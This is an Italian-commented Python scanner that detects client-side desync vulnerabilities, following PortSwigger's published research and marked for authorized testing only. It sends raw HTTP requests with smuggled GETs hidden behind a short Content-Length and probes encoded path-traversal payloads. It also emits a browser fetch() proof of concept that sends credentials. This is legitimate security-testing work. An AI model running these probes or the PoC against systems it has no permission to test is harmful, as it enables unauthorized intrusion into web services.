#!/usr/bin/env python3
"""
Client-Side Desynchronization (CSD) Vulnerability Detection Script — v2
=========================================================================

Rilevamento di vulnerabilità di Client-Side Desync (CSD) secondo la
metodologia pubblicata da PortSwigger:
  - https://portswigger.net/web-security/request-smuggling/browser/client-side-desync
  - https://portswigger.net/research/browser-powered-desync-attacks

SOLO per test di bug bounty / pentest autorizzati sui propri target.


"""

from __future__ import annotations

import argparse
import json
import logging
import random
import re
import socket
import ssl
import string
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import asdict, dataclass
from datetime import datetime, timezone
from html.parser import HTMLParser
from urllib.parse import urljoin, urlparse

logger = logging.getLogger("desync-detector")

DEFAULT_STATIC_ENDPOINTS = [
    "/favicon.ico",
    "/robots.txt",
    "/sitemap.xml",
    "/css/style.css",
    "/js/app.js",
    "/images/logo.png",
    "/assets/main.css",
    "/static/bundle.js",
]

DEFAULT_REDIRECT_CANDIDATES = [
    "/admin",
    "/login",
    "/wp-admin",
    "/administrator",
    "/dashboard",
    "/panel",
    "/secure",
    "/private",
]

DEFAULT_TRAVERSAL_PAYLOADS = [
    "/%2e%2e%2f",
    "/%2e%2e%2f%2e%2e%2f",
    "/%2e%2e%2f%2e%2e%2f%2e%2e%2f",
]

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)


# --------------------------------------------------------------------------- #
# Dati
# --------------------------------------------------------------------------- #

@dataclass
class ProbeResult:
    endpoint: str
    vulnerable: bool = False
    potential: bool = False
    response_time: float | None = None
    status1: int | None = None
    status2: int | None = None
    test_id: str | None = None
    details: str | None = None
    reason: str | None = None
    confidence: float | None = None


@dataclass
class HTTPResponse:
    status_code: int
    status_line: str
    headers: dict[str, str]
    body: bytes


def join_path(base_path: str, endpoint: str) -> str:
    """Unisce l'eventuale percorso base dell'URL target con un endpoint."""
    if not endpoint.startswith("/"):
        endpoint = "/" + endpoint
    return f"{base_path}{endpoint}" if base_path else endpoint


def random_id(length: int = 12) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))


# --------------------------------------------------------------------------- #
# Client HTTP raw: unico modo per controllare davvero Content-Length e body
# --------------------------------------------------------------------------- #

class RawHTTPClient:
    """Client HTTP/1.1 minimale su socket raw.

    Necessario perché le librerie ad alto livello (requests, http.client, ...)
    ricalcolano sempre Content-Length/Transfer-Encoding in base al body che
    gli passi: non permettono di dichiarare una lunghezza diversa da quella
    effettivamente trasmessa, che è esattamente ciò che serve per testare un
    desync.
    """

    def __init__(self, host: str, port: int, use_tls: bool, timeout: float = 10.0,
                 verify_tls: bool = True, sni_host: str | None = None):
        self.host = host
        self.port = port
        self.use_tls = use_tls
        self.timeout = timeout
        self.verify_tls = verify_tls
        self.sni_host = sni_host or host
        self.sock: socket.socket | ssl.SSLSocket | None = None

    def connect(self) -> None:
        raw_sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
        if self.use_tls:
            ctx = ssl.create_default_context()
            if not self.verify_tls:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            self.sock = ctx.wrap_socket(raw_sock, server_hostname=self.sni_host)
        else:
            self.sock = raw_sock
        self.sock.settimeout(self.timeout)

    def close(self) -> None:
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

    def send_raw(self, data: bytes) -> None:
        if self.sock is None:
            self.connect()
        self.sock.sendall(data)

    def _recv_chunk(self, size: int = 4096) -> bytes:
        try:
            return self.sock.recv(size)
        except socket.timeout:
            return b""

    def read_response(self) -> HTTPResponse:
        """Legge una singola risposta HTTP, rispettando Content-Length /
        Transfer-Encoding: chunked, così da fermarsi esattamente dove finisce
        la risposta (eventuali byte successivi restano nel socket per la
        richiesta seguente sulla stessa connessione). Parser volutamente
        minimale: non gestisce trailer o casi limite esotici, ma è
        sufficiente per i server tipicamente incontrati in un test."""
        buf = b""
        while b"\r\n\r\n" not in buf:
            chunk = self._recv_chunk()
            if not chunk:
                break
            buf += chunk
        if b"\r\n\r\n" not in buf:
            raise ConnectionError("connessione chiusa prima della fine degli header")

        head, _, rest = buf.partition(b"\r\n\r\n")
        lines = head.split(b"\r\n")
        status_line = lines[0].decode("latin1", "replace")
        headers: dict[str, str] = {}
        for line in lines[1:]:
            if b":" in line:
                k, _, v = line.partition(b":")
                headers[k.strip().decode("latin1").lower()] = v.strip().decode("latin1")

        body = rest
        content_length = headers.get("content-length")
        chunked = "chunked" in headers.get("transfer-encoding", "").lower()

        if chunked:
            body = self._read_chunked(body)
        elif content_length is not None and content_length.strip().isdigit():
            declared = int(content_length)
            need = declared - len(body)
            while need > 0:
                chunk = self._recv_chunk()
                if not chunk:
                    break
                body += chunk
                need -= len(chunk)
            body = body[:declared]

        try:
            status_code = int(status_line.split(" ")[1])
        except (IndexError, ValueError):
            status_code = 0

        return HTTPResponse(status_code, status_line, headers, body)

    def _read_chunked(self, already_read: bytes) -> bytes:
        buf = already_read
        body = b""
        while True:
            while b"\r\n" not in buf:
                chunk = self._recv_chunk()
                if not chunk:
                    return body
                buf += chunk
            size_line, _, buf = buf.partition(b"\r\n")
            try:
                size = int(size_line.split(b";")[0], 16)
            except ValueError:
                return body
            if size == 0:
                return body
            while len(buf) < size + 2:
                chunk = self._recv_chunk()
                if not chunk:
                    return body
                buf += chunk
            body += buf[:size]
            buf = buf[size + 2:]


def build_post_with_hidden_tail(path: str, host: str, visible_body: bytes,
                                 hidden_tail: bytes) -> bytes:
    """Costruisce una POST il cui Content-Length dichiara solo `visible_body`,
    ma sul filo include anche `hidden_tail` subito dopo. Vedi il docstring del
    modulo per la spiegazione della tecnica."""
    headers = {
        "Host": host,
        "User-Agent": USER_AGENT,
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": str(len(visible_body)),
        "Connection": "keep-alive",
    }
    header_block = "".join(f"{k}: {v}\r\n" for k, v in headers.items())
    request_line = f"POST {path} HTTP/1.1\r\n"
    return request_line.encode() + header_block.encode() + b"\r\n" + visible_body + hidden_tail


def build_simple_get(path: str, host: str) -> bytes:
    return (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {USER_AGENT}\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode()


# --------------------------------------------------------------------------- #
# Crawler leggero per scoprire endpoint reali (nessuna dipendenza esterna)
# --------------------------------------------------------------------------- #

class _LinkExtractor(HTMLParser):
    """Estrae gli attributi che puntano ad altre risorse da una pagina HTML,
    usando solo html.parser di libreria standard (niente BeautifulSoup, per
    restare senza dipendenze esterne)."""

    _LINK_ATTRS = {
        "a": "href",
        "link": "href",
        "script": "src",
        "img": "src",
        "form": "action",
        "iframe": "src",
    }

    def __init__(self) -> None:
        super().__init__()
        self.links: list[str] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        attr_name = self._LINK_ATTRS.get(tag)
        if not attr_name:
            return
        for name, value in attrs:
            if name == attr_name and value:
                self.links.append(value)
                break


def extract_links(html: str) -> list[str]:
    parser = _LinkExtractor()
    try:
        parser.feed(html)
    except Exception:
        pass
    return parser.links


class SiteCrawler:
    """Crawl same-origin minimale più parsing di robots.txt/sitemap.xml, per
    scoprire endpoint realmente esistenti invece di affidarsi solo a liste di
    path indovinati. Usa RawHTTPClient (stesso client del resto dello
    script), quindi nessuna dipendenza esterna in più."""

    def __init__(self, host: str, port: int, use_tls: bool, base_path: str,
                 timeout: float = 10.0, verify_tls: bool = True,
                 max_depth: int = 2, max_pages: int = 50):
        self.host = host
        self.port = port
        self.use_tls = use_tls
        self.base_path = base_path
        self.timeout = timeout
        self.verify_tls = verify_tls
        self.max_depth = max_depth
        self.max_pages = max_pages
        self.origin = f"{'https' if use_tls else 'http'}://{host}"

    def _fetch(self, path: str) -> HTTPResponse | None:
        client = RawHTTPClient(self.host, self.port, self.use_tls,
                                timeout=self.timeout, verify_tls=self.verify_tls)
        try:
            client.connect()
            client.send_raw(build_simple_get(path, self.host))
            return client.read_response()
        except Exception as exc:
            logger.debug("crawl: errore su %s: %s", path, exc)
            return None
        finally:
            client.close()

    def _strip_base(self, path: str) -> str:
        """Riporta un path assoluto alla forma 'relativa al base_path' usata
        altrove nello script (es. join_path la riaggiunge dopo)."""
        if self.base_path and path.startswith(self.base_path):
            return path[len(self.base_path):] or "/"
        return path

    def _same_origin_path(self, link: str, current_path: str) -> str | None:
        if link.startswith(("mailto:", "tel:", "javascript:", "#", "data:")):
            return None
        absolute = urljoin(f"{self.origin}{current_path}", link)
        parsed = urlparse(absolute)
        if parsed.hostname and parsed.hostname != self.host:
            return None  # fuori dal dominio target, non lo seguiamo
        path = parsed.path or "/"
        if parsed.query:
            path += f"?{parsed.query}"
        return path

    def discover_robots_and_sitemap(self) -> tuple[list[str], list[str]]:
        """Ritorna (candidati da robots.txt Disallow, url da sitemap.xml),
        entrambi relativi al base_path."""
        disallowed: list[str] = []
        sitemap_paths = ["/sitemap.xml"]

        robots = self._fetch(join_path(self.base_path, "/robots.txt"))
        if robots and robots.status_code == 200:
            text = robots.body.decode("utf-8", "replace")
            explicit_sitemaps = []
            for line in text.splitlines():
                line = line.strip()
                if line.lower().startswith("disallow:"):
                    value = line.split(":", 1)[1].strip()
                    if value and value != "/":
                        disallowed.append(self._strip_base(value))
                elif line.lower().startswith("sitemap:"):
                    parsed = urlparse(line.split(":", 1)[1].strip())
                    if parsed.hostname in (None, self.host):
                        explicit_sitemaps.append(parsed.path or "/sitemap.xml")
            if explicit_sitemaps:
                sitemap_paths = explicit_sitemaps

        sitemap_entries: list[str] = []
        for sm_path in sitemap_paths:
            sm = self._fetch(join_path(self.base_path, sm_path))
            if sm and sm.status_code == 200:
                for loc in re.findall(rb"<loc>(.*?)</loc>", sm.body, re.IGNORECASE):
                    parsed = urlparse(loc.decode("utf-8", "replace"))
                    if parsed.hostname in (None, self.host):
                        sitemap_entries.append(self._strip_base(parsed.path or "/"))

        return disallowed, sitemap_entries

    def crawl_links(self) -> list[str]:
        """BFS same-origin a partire dalla home page, fino a
        max_depth/max_pages. Ritorna path relativi al base_path."""
        start_path = self.base_path or "/"
        visited: set[str] = set()
        queue: list[tuple[str, int]] = [(start_path, 0)]
        discovered: list[str] = []

        while queue and len(visited) < self.max_pages:
            path, depth = queue.pop(0)
            if path in visited:
                continue
            visited.add(path)

            response = self._fetch(path)
            if response is None or response.status_code >= 400:
                continue
            discovered.append(self._strip_base(path))

            if depth >= self.max_depth:
                continue

            content_type = response.headers.get("content-type", "")
            if "html" not in content_type:
                continue

            html = response.body.decode("utf-8", "replace")
            for link in extract_links(html):
                resolved = self._same_origin_path(link, path)
                if resolved and resolved not in visited:
                    queue.append((resolved, depth + 1))

        return discovered


# --------------------------------------------------------------------------- #
# Probe CSD
# --------------------------------------------------------------------------- #

class DesyncProbe:
    def __init__(self, host: str, port: int, use_tls: bool, base_path: str,
                 timeout: float = 10.0, verify_tls: bool = True):
        self.host = host
        self.port = port
        self.use_tls = use_tls
        self.base_path = base_path
        self.timeout = timeout
        self.verify_tls = verify_tls

    def full_path(self, endpoint: str) -> str:
        return join_path(self.base_path, endpoint)

    def _client(self) -> RawHTTPClient:
        return RawHTTPClient(self.host, self.port, self.use_tls,
                              timeout=self.timeout, verify_tls=self.verify_tls)

    def probe(self, endpoint: str) -> ProbeResult:
        """Invia una richiesta con Content-Length dichiarato più corto dei
        byte realmente trasmessi (il resto è una richiesta GET "nascosta" con
        un identificativo univoco), poi una richiesta di follow-up sulla
        stessa connessione: se la risposta che arriva per prima è quella
        della richiesta nascosta invece che quella del follow-up, è il
        segnale di desync."""
        path = self.full_path(endpoint)
        test_id = random_id(12)
        visible_body = b"test=1"
        hidden_tail = (
            f"GET /404-csd-{test_id} HTTP/1.1\r\n"
            f"Host: {self.host}\r\nFoo: bar\r\n\r\n"
        ).encode()

        client = self._client()
        try:
            client.connect()
            request = build_post_with_hidden_tail(path, self.host, visible_body, hidden_tail)
            start = time.monotonic()
            client.send_raw(request)
            try:
                response1 = client.read_response()
            except (socket.timeout, ConnectionError, OSError):
                return ProbeResult(
                    endpoint,
                    reason="timeout: il server ha atteso i byte residui dichiarati "
                    "nel Content-Length (non vulnerabile)",
                )
            elapsed = time.monotonic() - start

            if elapsed >= 2.0:
                return ProbeResult(
                    endpoint, response_time=elapsed, status1=response1.status_code,
                    reason=f"il server ha impiegato {elapsed:.2f}s - non vulnerabile",
                )

            time.sleep(0.5)
            try:
                client.send_raw(build_simple_get(path, self.host))
                response2 = client.read_response()
            except (socket.timeout, ConnectionError, OSError):
                return ProbeResult(
                    endpoint, potential=True, response_time=elapsed,
                    status1=response1.status_code,
                    reason="la richiesta di follow-up è andata in timeout - "
                    "desync possibile ma non confermato",
                )

            body_text = response2.body.decode("latin1", "replace")
            headers_text = " ".join(f"{k}: {v}" for k, v in response2.headers.items())
            if response2.status_code == 404 and (test_id in body_text or test_id in headers_text):
                return ProbeResult(
                    endpoint, vulnerable=True, response_time=elapsed,
                    status1=response1.status_code, status2=response2.status_code,
                    test_id=test_id,
                    details=f"la richiesta nascosta ({test_id}) ha ricevuto risposta 404 "
                    "sulla connessione riutilizzata, al posto del follow-up",
                )
            return ProbeResult(
                endpoint, potential=True, response_time=elapsed,
                status1=response1.status_code, status2=response2.status_code,
                reason="risposta rapida ma nessun desync confermato",
            )
        finally:
            client.close()


# --------------------------------------------------------------------------- #
# Scanner
# --------------------------------------------------------------------------- #

class DesyncScanner:
    def __init__(self, target_url: str, timeout: float = 10.0, concurrency: int = 5,
                 verify_tls: bool = True, confirmations: int = 5,
                 confidence_threshold: float = 60.0, delay: float = 0.0,
                 enable_crawl: bool = False, crawl_depth: int = 2, max_crawl_pages: int = 50):
        parsed = urlparse(target_url)
        if parsed.scheme not in ("http", "https") or not parsed.hostname:
            raise ValueError("URL non valido: serve http:// o https://host[:porta][/percorso]")

        self.target_url = target_url.rstrip("/")
        self.host = parsed.hostname
        self.port = parsed.port or (443 if parsed.scheme == "https" else 80)
        self.use_tls = parsed.scheme == "https"
        self.base_path = parsed.path.rstrip("/")
        self.timeout = timeout
        self.concurrency = concurrency
        self.verify_tls = verify_tls
        self.confirmations = confirmations
        self.confidence_threshold = confidence_threshold
        self.delay = delay
        self.enable_crawl = enable_crawl
        self.crawl_depth = crawl_depth
        self.max_crawl_pages = max_crawl_pages
        self.probe = DesyncProbe(self.host, self.port, self.use_tls, self.base_path,
                                  timeout=timeout, verify_tls=verify_tls)

    # -- scoperta endpoint reali --------------------------------------------- #

    def crawl_target(self) -> tuple[list[str], list[str]]:
        """Esegue crawl + robots.txt/sitemap.xml. Ritorna
        (endpoint_pubblici, candidati_nascosti): i primi arricchiscono gli
        endpoint "statici" (pagine reali, confermate), i secondi i candidati
        di redirect (path da robots.txt, tipicamente non linkati)."""
        logger.info("Scoperta endpoint reali (crawl + robots.txt + sitemap.xml)...")
        crawler = SiteCrawler(self.host, self.port, self.use_tls, self.base_path,
                               timeout=self.timeout, verify_tls=self.verify_tls,
                               max_depth=self.crawl_depth, max_pages=self.max_crawl_pages)
        disallowed, sitemap_entries = crawler.discover_robots_and_sitemap()
        linked = crawler.crawl_links()

        public_endpoints = sorted(set(linked) | set(sitemap_entries))
        hidden_candidates = sorted(set(disallowed))
        logger.info("Crawl: %d endpoint pubblici, %d candidati da robots.txt",
                    len(public_endpoints), len(hidden_candidates))
        return public_endpoints, hidden_candidates

    # -- connettività ------------------------------------------------------ #

    def test_basic_connectivity(self) -> bool:
        logger.info("Verifica connettività verso %s", self.target_url)
        client = RawHTTPClient(self.host, self.port, self.use_tls,
                                timeout=self.timeout, verify_tls=self.verify_tls)
        try:
            client.connect()
            client.send_raw(build_simple_get(self.base_path or "/", self.host))
            response = client.read_response()
            logger.info("Target raggiungibile (status %s)", response.status_code)
            return True
        except Exception as exc:
            logger.error("Impossibile raggiungere il target: %s", exc)
            return False
        finally:
            client.close()

    # -- fasi di test -------------------------------------------------------- #

    def _run_probes(self, endpoints: list[str]) -> tuple[list[ProbeResult], list[ProbeResult]]:
        vulnerable: list[ProbeResult] = []
        potential: list[ProbeResult] = []
        with ThreadPoolExecutor(max_workers=self.concurrency) as pool:
            futures = {pool.submit(self.probe.probe, ep): ep for ep in endpoints}
            for future in as_completed(futures):
                result = future.result()
                if result.vulnerable:
                    vulnerable.append(result)
                    logger.warning("[VULNERABILE] %s - %s", result.endpoint, result.details)
                elif result.potential:
                    potential.append(result)
                    logger.info("[POTENZIALE] %s - %s", result.endpoint, result.reason)
                else:
                    logger.debug("[OK] %s - %s", result.endpoint, result.reason)
                if self.delay:
                    time.sleep(self.delay)
        return vulnerable, potential

    def test_static_file_endpoints(self, endpoints: list[str]) -> tuple[list[ProbeResult], list[ProbeResult]]:
        logger.info("Test su endpoint statici...")
        return self._run_probes(endpoints)

    def test_redirect_endpoints(self, candidates: list[str]) -> tuple[list[ProbeResult], list[ProbeResult]]:
        logger.info("Test su endpoint che generano redirect...")
        redirecting = []
        for endpoint in candidates:
            client = RawHTTPClient(self.host, self.port, self.use_tls,
                                    timeout=self.timeout, verify_tls=self.verify_tls)
            try:
                client.connect()
                client.send_raw(build_simple_get(self.probe.full_path(endpoint), self.host))
                response = client.read_response()
                if response.status_code in (301, 302, 303, 307, 308):
                    logger.info("%s genera redirect (%s) - lo includo nel test CSD",
                                endpoint, response.status_code)
                    redirecting.append(endpoint)
            except Exception as exc:
                logger.debug("Errore testando %s: %s", endpoint, exc)
            finally:
                client.close()
        if not redirecting:
            return [], []
        return self._run_probes(redirecting)

    def test_error_triggering_payloads(self, payloads: list[str]) -> list[ProbeResult]:
        logger.info("Test su payload che innescano errori (path traversal, ...)")
        vulnerable, _potential = self._run_probes(payloads)
        return vulnerable

    def confirm(self, result: ProbeResult) -> ProbeResult:
        logger.info("Conferma vulnerabilità per %s...", result.endpoint)
        confirmations = 0
        for i in range(self.confirmations):
            logger.debug("conferma %d/%d", i + 1, self.confirmations)
            if self.probe.probe(result.endpoint).vulnerable:
                confirmations += 1
            time.sleep(1)
        confidence = (confirmations / self.confirmations) * 100
        result.confidence = confidence
        logger.info("%d/%d conferme (confidenza %.1f%%)", confirmations, self.confirmations, confidence)
        return result

    # -- PoC ----------------------------------------------------------------- #

    def generate_browser_poc(self, endpoint: str) -> str:
        test_id = random_id(8)
        return f"""// Proof of concept Client-Side Desync
// Da eseguire nella console del browser, da un'origine diversa (serve HTTPS)
fetch('{self.target_url}{endpoint}', {{
    method: 'POST',
    body: 'test=1GET /404-browser-{test_id} HTTP/1.1\\r\\nHost: {self.host}\\r\\nFoo: x\\r\\n\\r\\n',
    headers: {{'Content-Type': 'text/plain'}},
    mode: 'no-cors',
    credentials: 'include'
}}).then(() => {{
    location = '{self.target_url}/';
}});
// Se vulnerabile, la pagina mostrerà un 404 con id: {test_id}
"""

    # -- scan completo --------------------------------------------------------- #

    def run_full_scan(self, static_endpoints: list[str], redirect_candidates: list[str],
                       traversal_payloads: list[str], skip_confirm: bool = False) -> dict:
        logger.info("=" * 70)
        logger.info("CLIENT-SIDE DESYNC (CSD) SCANNER — target: %s", self.target_url)
        logger.info("=" * 70)

        if not self.test_basic_connectivity():
            return {"reachable": False, "target": self.target_url}

        if self.enable_crawl:
            public_endpoints, hidden_candidates = self.crawl_target()
            static_endpoints = sorted(set(static_endpoints) | set(public_endpoints))
            redirect_candidates = sorted(set(redirect_candidates) | set(hidden_candidates))

        vuln_static, pot_static = self.test_static_file_endpoints(static_endpoints)
        vuln_redirect, pot_redirect = self.test_redirect_endpoints(redirect_candidates)
        vuln_error = self.test_error_triggering_payloads(traversal_payloads)

        all_vulnerable = vuln_static + vuln_redirect + vuln_error
        all_potential = pot_static + pot_redirect

        if skip_confirm:
            confirmed = all_vulnerable
        else:
            confirmed = []
            for vuln in all_vulnerable:
                confirmed_result = self.confirm(vuln)
                if (confirmed_result.confidence is not None
                        and confirmed_result.confidence >= self.confidence_threshold):
                    confirmed.append(confirmed_result)

        logger.info("=" * 70)
        logger.info("RISULTATI FINALI")
        logger.info("=" * 70)
        if confirmed:
            logger.warning("Vulnerabilità Client-Side Desync CONFERMATE:")
            for v in confirmed:
                logger.warning("  - %s (tempo di risposta %.2fs)", v.endpoint, v.response_time or 0)
            logger.info("Esempio di PoC browser per %s:\n%s", confirmed[0].endpoint,
                        self.generate_browser_poc(confirmed[0].endpoint))
        elif all_potential:
            logger.info("Indicatori potenziali trovati ma non confermati:")
            for p in all_potential:
                logger.info("  - %s: %s", p.endpoint, p.reason)
        else:
            logger.info("Nessuna vulnerabilità di client-side desync rilevata")

        return {
            "reachable": True,
            "target": self.target_url,
            "scanned_at": datetime.now(timezone.utc).isoformat(),
            "confirmed_vulnerabilities": [asdict(r) for r in confirmed],
            "potential_indicators": [asdict(r) for r in all_potential],
        }


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #

def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Scanner di vulnerabilità Client-Side Desync (CSD)",
        epilog="Basato sulla ricerca PortSwigger. Usare solo su target autorizzati.\n"
               "Exit code: 0 nessuna vulnerabilità confermata, 1 vulnerabilità confermata, "
               "2 interrotto dall'utente, 3 errore (target non raggiungibile o input non valido).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("target", help="URL target (es. https://example.com)")
    parser.add_argument("--timeout", type=float, default=10.0, help="timeout per richiesta in secondi")
    parser.add_argument("--concurrency", type=int, default=5, help="richieste concorrenti")
    parser.add_argument("--confirmations", type=int, default=5,
                         help="numero di test di conferma per vulnerabilità")
    parser.add_argument("--confidence-threshold", type=float, default=60.0,
                         help="percentuale minima di conferme per considerare confermata la vulnerabilità")
    parser.add_argument("--delay", type=float, default=0.0, help="pausa (s) tra una richiesta e l'altra")
    parser.add_argument("--endpoints-file", type=str, default=None,
                         help="file con un endpoint statico per riga, al posto della lista predefinita")
    parser.add_argument("--redirect-candidates-file", type=str, default=None,
                         help="file con un endpoint candidato a redirect per riga, al posto della lista predefinita")
    parser.add_argument("--traversal-payloads-file", type=str, default=None,
                         help="file con un payload di path traversal per riga, al posto della lista predefinita")
    parser.add_argument("--crawl", action="store_true",
                         help="scopri endpoint reali con un crawl leggero + robots.txt/sitemap.xml, "
                              "in aggiunta alle liste predefinite/da file")
    parser.add_argument("--crawl-depth", type=int, default=2, help="profondità massima del crawl (default: 2)")
    parser.add_argument("--max-crawl-pages", type=int, default=50,
                         help="numero massimo di pagine da visitare durante il crawl (default: 50)")
    parser.add_argument("--skip-confirm", action="store_true", help="salta la fase di conferma")
    parser.add_argument("--insecure", "-k", action="store_true", help="non verificare il certificato TLS")
    parser.add_argument("--json-report", type=str, default=None, help="percorso dove salvare il report in JSON")
    parser.add_argument("-v", "--verbose", action="store_true", help="log più dettagliato")
    return parser.parse_args(argv)


def load_endpoints(path: str) -> list[str]:
    with open(path, encoding="utf-8") as fh:
        return [line.strip() for line in fh if line.strip() and not line.startswith("#")]


def main(argv: list[str] | None = None) -> int:
    args = parse_args(argv)
    logging.basicConfig(level=logging.DEBUG if args.verbose else logging.INFO, format="%(message)s")

    if not args.target.startswith(("http://", "https://")):
        logger.error("Specificare un URL completo con http:// o https://")
        return 3

    logger.warning("Questo strumento è solo per test di bug bounty/pentest autorizzati!")
    logger.warning("Le richieste vengono inviate su HTTP/1.1 raw: assicurati di avere il permesso "
                    "di testare il target.")

    static_endpoints = load_endpoints(args.endpoints_file) if args.endpoints_file else DEFAULT_STATIC_ENDPOINTS
    redirect_candidates = (load_endpoints(args.redirect_candidates_file)
                           if args.redirect_candidates_file else DEFAULT_REDIRECT_CANDIDATES)
    traversal_payloads = (load_endpoints(args.traversal_payloads_file)
                          if args.traversal_payloads_file else DEFAULT_TRAVERSAL_PAYLOADS)

    try:
        scanner = DesyncScanner(
            args.target, timeout=args.timeout, concurrency=args.concurrency,
            verify_tls=not args.insecure, confirmations=args.confirmations,
            confidence_threshold=args.confidence_threshold, delay=args.delay,
            enable_crawl=args.crawl, crawl_depth=args.crawl_depth,
            max_crawl_pages=args.max_crawl_pages,
        )
    except ValueError as exc:
        logger.error(str(exc))
        return 3

    report = scanner.run_full_scan(static_endpoints, redirect_candidates,
                                    traversal_payloads, skip_confirm=args.skip_confirm)

    if args.json_report:
        with open(args.json_report, "w", encoding="utf-8") as fh:
            json.dump(report, fh, indent=2, ensure_ascii=False, default=str)
        logger.info("Report JSON salvato in %s", args.json_report)

    if not report.get("reachable", False):
        return 3
    return 1 if report.get("confirmed_vulnerabilities") else 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        logger.info("Scan interrotta dall'utente.")
        sys.exit(2)